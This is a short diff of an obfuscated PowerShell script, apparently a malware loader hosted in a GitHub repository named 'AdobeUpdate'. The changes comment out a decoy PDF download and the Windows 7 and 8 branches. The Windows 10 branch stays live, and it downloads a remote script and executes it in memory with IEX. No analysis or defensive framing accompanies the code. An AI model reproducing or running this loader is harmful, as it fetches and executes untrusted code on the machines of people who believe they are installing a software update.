@@ -34,17 +34,17 @@ finally {
 
 
 
-    $lwoxheihwic = "https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/random.pdf"
+    #$lwoxheihwic = "https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/random.pdf"
 
-    $osicheuche = 'https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib30.ps1'
+    #$osicheuche = 'https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib30.ps1'
 
     $ishscjsof = 'https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib207.ps1'
 
 
 
-    $path = ".\random.pdf"
-    (New-Object System.Net.WebClient).DownloadFile($lwoxheihwic, $path)
-    Start-Process -F $path
+    #$path = ".\random.pdf"
+    #(New-Object System.Net.WebClient).DownloadFile($lwoxheihwic, $path)
+    #Start-Process -F $path
 
 
 
@@ -53,13 +53,13 @@ finally {
     $OSVersion = (Get-WmiObject Win32_OperatingSystem).Caption
 
 
-    if ($OSVersion -match "7") {
-        IEX ((new-object net.webclient).downloadstring($osicheuche))
-    }
+    #if ($OSVersion -match "7") {
+    #    IEX ((new-object net.webclient).downloadstring($osicheuche))
+    #}
     
-    if ($OSVersion -match "8") {
-        IEX ((new-object net.webclient).downloadstring($osicheuche))
-    }
+    #if ($OSVersion -match "8") {
+    #    IEX ((new-object net.webclient).downloadstring($osicheuche))
+    #}
         
     if ($OSVersion -match "10") {
         IEX ((new-object net.webclient).downloadstring($ishscjsof))
